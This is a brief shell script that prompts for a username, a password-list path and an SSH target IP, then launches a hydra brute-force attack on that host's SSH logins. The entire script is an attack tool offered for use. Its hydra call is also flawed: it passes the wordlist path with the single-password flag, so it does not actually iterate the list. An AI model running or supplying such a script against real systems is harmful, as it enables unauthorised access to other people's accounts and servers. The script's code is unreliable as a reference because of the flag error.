echo '---------------what is the username you would like to try-------------------------------'
read user_list
clear
echo '---------------Whats the path to the password list you would like to use-----------------'
read wordlist
echo '----------------Finally what is the SSH IP EX ==> 192.20.30.1----------------------------'
read host

echo 'Sure, running attack'

hydra -l $user_list -p $wordlist $host ssh